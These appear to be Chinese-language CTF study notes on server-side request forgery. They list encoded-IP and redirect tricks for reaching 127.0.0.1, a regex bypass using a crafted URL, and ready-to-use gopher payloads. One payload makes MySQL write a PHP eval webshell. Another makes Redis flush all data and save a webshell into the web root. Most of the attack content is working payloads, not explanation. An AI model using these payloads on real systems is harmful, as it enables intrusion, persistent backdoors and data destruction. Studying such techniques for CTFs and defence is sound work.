过滤了/localhost|127.0.0
可用 127.0.1
127.1
进制转绕过

- 2130706433 10 进制 http://2130706433
- 017700000001 8 进制 http://017700000001
- 7F000001 16 进制 http://0x7F000001

过滤了 0,1
利用 302 跳转（需要有域名）

```php
<?php
header("Location:http://127.0.0.1/flag.php");

```

url=http://sudo.cc/flag.php

绕过前缀限制和后缀限制

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
$url=$_POST['url'];
$x=parse_url($url);
if(preg_match('/^http:\/\/ctf\..*show$/i',$url)){
    echo file_get_contents($url);
}
```

url=http://ctf.@127.0.0.1/flag.php?show

ssrf 攻击 mysql，redis

mysql 可以利用 gopherus 生成 payload
直接写马

```sql
select '<?php eval($_POST[mob]);?>' into outfile '/var/www/html/mob.php';

-- gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%4a%00%00%00%03%73%65%6c%65%63%74%20%27%3c%3f%70%68%70%20%65%76%61%6c%28%24%5f%50%4f%53%54%5b%6d%6f%62%5d%29%3b%3f%3e%27%20%69%6e%74%6f%20%6f%75%74%66%69%6c%65%20%27%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%6d%6f%62%2e%70%68%70%27%3b%01%00%00%00%01

-- _之后再进行一次编码即可

```

ssrf 打 redis：
写 webshell
写 ssh 公钥
写计划任务反弹 shell
主从复制

也是利用 gopherus 生成 payload，但是如果写不进去的话需要注意是否取消 url 编码？

```
gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2430%0D%0A%0A%0A%3C%3Fphp%20eval%28%24_POST%5Bmob%5D%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A


```

dict 协议也能进行 ssrf
